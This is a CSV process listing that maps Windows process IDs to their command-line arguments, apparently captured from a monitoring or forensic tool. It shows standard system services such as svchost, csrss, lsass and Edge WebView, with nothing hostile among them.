PID,Args
4,-
104,-
180,taskhostw.exe {222A245B-E637-4AE9-A93F-A59CA119A75E}
400,C:\\WINDOWS\\system32\\svchost.exe -k DcomLaunch -p -s LSM
420,\\SystemRoot\\System32\\smss.exe
440,C:\\WINDOWS\\system32\\ApplicationFrameHost.exe -Embedding
504,C:\\WINDOWS\\system32\\svchost.exe -k RPCSS -p
572,"%SystemRoot%\\system32\\csrss.exe ObjectDirectory=\\Windows SharedSection=1024,20480,768 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=sxssrv,4 ProfileControl=Off MaxRequestThreads=16"
640,-
644,wininit.exe
652,"%SystemRoot%\\system32\\csrss.exe ObjectDirectory=\\Windows SharedSection=1024,20480,768 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=sxssrv,4 ProfileControl=Off MaxRequestThreads=16"
684,C:\\WINDOWS\\system32\\svchost.exe -k netsvcsRedirectionGuard -p -s SENS
708,winlogon.exe
780,C:\\WINDOWS\\system32\\services.exe
796,C:\\WINDOWS\\system32\\lsass.exe
816,"""dwm.exe"""
840, /updateInstalled /background
904,"""fontdrvhost.exe"""
912,"""fontdrvhost.exe"""
924,C:\\WINDOWS\\system32\\svchost.exe -k DcomLaunch -p
980,C:\\WINDOWS\\system32\\svchost.exe -k whesvc -p -s whesvc
1028,"""C:\\Program Files (x86)\\Microsoft\\EdgeWebView\\Application\\143.0.3650.96\\msedgewebview2.exe"" --type=renderer --noerrdialogs --user-data-dir=""C:\\Users\\administrator\\AppData\\Local\\Packages\\MicrosoftWindows.Client.WebExperience_cw5n1h2txyewy\\LocalState\\EBWebView"" --webview-exe-name=Widgets.exe --webview-exe-version=525.31002.10.0 --embedded-browser-webview=1 --dma-cps-flags=0 --video-capture-use-gpu-memory-buffer --lang=en-US --js-flags=--expose-gc --device-scale-factor=1.25 --num-raster-threads=1 --renderer-client-id=5 --time-ticks-at-unix-epoch=-1766672747649914 --launch-time-ticks=729540050 --ram-no-pressure-read-main-dll --metrics-shmem-handle=3672,i,3118563095336216820,3135613210067653858,2097152 --field-trial-handle=1916,i,8635894297972141277,11337288381855299968,262144 --variations-seed-version --trace-process-track-uuid=3190708990997080739 --mojo-platform-channel-handle=3700 /pfhostedapp:1f3d0ca33106b1de2a6f2986b70740d61f4ac3d5 /prefetch:1"
1072,C:\\WINDOWS\\system32\\svchost.exe -k LocalSystemNetworkRestricted -p -s webthreatdefusersvc
1080,C:\\WINDOWS\\System32\\svchost.exe -k netsvcs -p -s BDESVC
1096,C:\\WINDOWS\\system32\\svchost.exe -k NetworkService -p
1152,C:\\WINDOWS\\system32\\svchost.exe -k LocalSystemNetworkRestricted -p -s PcaSvc
1212,C:\\WINDOWS\\System32\\svchost.exe -k LocalSystemNetworkRestricted -p -s NcbService
1220,C:\\WINDOWS\\System32\\svchost.exe -k LocalServiceNetworkRestricted -p -s lmhosts
1228,C:\\WINDOWS\\system32\\svchost.exe -k LocalServiceNoNetwork -p
1236,C:\\WINDOWS\\system32\\svchost.exe -k LocalServiceNetworkRestricted -p -s TimeBrokerSvc
1304,\\??\\C:\\WINDOWS\\system32\\conhost.exe 0x4
1392,C:\\WINDOWS\\system32\\svchost.exe -k netsvcs -p -s Schedule
